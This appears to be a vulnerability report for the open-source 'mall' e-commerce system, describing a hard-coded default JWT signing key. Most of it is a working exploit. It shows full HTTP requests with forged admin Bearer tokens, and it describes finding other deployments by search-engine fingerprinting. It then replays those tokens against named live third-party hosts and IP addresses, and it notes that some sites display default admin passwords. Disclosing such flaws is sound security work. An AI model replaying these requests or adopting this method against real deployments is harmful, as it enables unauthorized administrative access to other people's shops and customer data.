# 1. Basic Vulnerability Information

**Affected URL**: https://47.116.173.18/#/login
                  https://120.77.182.94/#/login

**Affected Parameters:**   Authorization

**Impact Scope:**   v1.0.3

**Vulnerability description：** 
The mall project is an e-commerce system that has discovered a vulnerability classified as serious. If the default JWT key is not modified when using this template to build the system, and the JWT key is generated to bypass identity permissions, it may result in the ability to perform operations such as adding, deleting, modifying, and querying the e-commerce system

# 2. Reproduction Steps

Project address:
Backend project:https://github.com/macrozheng/mall

Front end project:https://github.com/macrozheng/mall-admin-web

The configuration file has a default key hard coded
![image](https://github.com/user-attachments/assets/5eae0fca-a259-415e-9b7d-655978638efd)

Request package
```
POST /admin/login HTTP/1.1
Host: 127.0.0.1:8080
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua-mobile: ?0
Content-Type: application/json;charset=UTF-8
sec-ch-ua-platform: "Windows"
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br, zstd
Accept: application/json, text/plain, */*
Referer: http://127.0.0.1:8090/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Fetch-Site: same-site
Origin: http://127.0.0.1:8090
Sec-Fetch-Mode: cors
Content-Length: 40

{"username":"admin","password":"123456"}
```

Built locally, JWT will be generated when logging in. 

![image](https://github.com/user-attachments/assets/7d348547-bcb2-476c-92eb-a8bea90535b7)

Using search engine search System fingerprint features,Collect several systems built using this template.

![image](https://github.com/user-attachments/assets/c56e579e-b8f7-4bc6-9d90-9b5b4f5f8758)

Add the generated token to the headers of the affected system and send it, and successfully view the content after logging in
Alternatively, you can directly use the local request package to replace the domain name and API

![image](https://github.com/user-attachments/assets/605ec792-5df1-41e4-b88d-d21796fa4e33)

Request package
```
GET /admin/list?pageNum=1&pageSize=10 HTTP/1.1
Host: adminapi.shuyankong.com
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImNyZWF0ZWQiOjE3NDk1MjA0MDYzNTAsImV4cCI6MTc1MDEyNTIwNn0.GiKV2yhU_t9P-hwNJ-tDsJ_ucF6kUgF0OSnzpY4bswp3_HhLwXxDNGLNxkBgV22HauJW9EpoXhi8RpLQsce_vw
sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"
Accept-Language: zh-CN,zh;q=0.9
Origin: http://127.0.0.1:8090
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8090/
Sec-Fetch-Site: same-site
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br, zstd
Accept: application/json, text/plain, */*
Sec-Fetch-Mode: cors


```

![image](https://github.com/user-attachments/assets/e68eb213-2bc0-4482-be12-55c3ca977830)

Request package
```
GET /jz-api/admin/list?pageNum=1&pageSize=10 HTTP/1.1
Host: gift.zhtx.pro
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImNyZWF0ZWQiOjE3NDk1MTg4MzM0NzcsImV4cCI6MTc1MDEyMzYzM30.-S0okwm6Z1GY2seGbGkXRJv2L3OmRhxCwlinlyTmOkaUmiRRtIUvbDR8drMySjq7oT3W7DUytIm0be6RM2qxpw
sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"
Accept-Language: zh-CN,zh;q=0.9
Origin: http://127.0.0.1:8090
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8090/
Sec-Fetch-Site: same-site
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br, zstd
Accept: application/json, text/plain, */*
Sec-Fetch-Mode: cors


```

Some systems default to displaying account passwords.You can directly log in to the backend

![image](https://github.com/user-attachments/assets/fcb8043b-9f36-4515-baab-be62aff14937)

![image](https://github.com/user-attachments/assets/e1561a2a-0dab-4582-8deb-a490726b55c7)




# 4. Remediation Suggestions
Modify default values. Generate a random key
